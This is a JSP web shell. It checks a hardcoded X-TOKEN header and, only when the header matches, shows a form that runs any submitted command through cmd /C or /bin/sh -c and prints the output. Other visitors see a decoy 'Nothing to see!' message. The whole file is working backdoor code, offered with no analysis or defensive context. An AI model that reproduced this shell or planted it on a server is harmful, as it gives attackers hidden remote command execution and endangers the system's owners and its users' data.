<% if (request.getHeader("X-TOKEN") !=null && request.getHeader("X-TOKEN").equals("9ebc314e6dacf0a6ab1c08c444b3deb50338b188a70cad862a6482d1ae0e5be2")) { %>
      <form method="POST" action="">
	<input type="text" name="cmd" />
	<input type="submit" value="Exec!" />
</form> <%!
public String esc(String str){
	StringBuffer sb = new StringBuffer();
	for(char c : str.toCharArray())
		if( c >= '0' && c <= '9' || c >= 'A' && c <= 'Z' || c >= 'a' && c <= 'z' || c == ' ' )
			sb.append( c );
		else
			sb.append("&#"+(int)(c&0xff)+";");
	return sb.toString();
} %><%
String[] WINDOWS_COMMAND_INTERPRETER = {"cmd", "/C"}; // Dos,Windows
String[] LINUX_COMMAND_INTERPRETER = {"/bin/sh","-c"}; 	// Unix
String cmd = request.getParameter("cmd");
if ( cmd != null) {
	out.println("<pre>Command was: <b>"+esc(cmd)+"</b>\n");
	String[] comm = new String[3];
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) {
			comm[0] = WINDOWS_COMMAND_INTERPRETER[0];
			comm[1] = WINDOWS_COMMAND_INTERPRETER[1];
		} else {
			comm[0] = LINUX_COMMAND_INTERPRETER[0];
			comm[1] = LINUX_COMMAND_INTERPRETER[1];
		}
	comm[2] = cmd;
	java.io.DataInputStream in = new java.io.DataInputStream(Runtime.getRuntime().exec(comm).getInputStream());
	String line = in.readLine();
	while( line != null ){
		out.println(esc(line));
		line = in.readLine();
	}
	out.println("</pre>");
} %>
<% } else { %>
      <p> Nothing to see!</p>
<% } %>
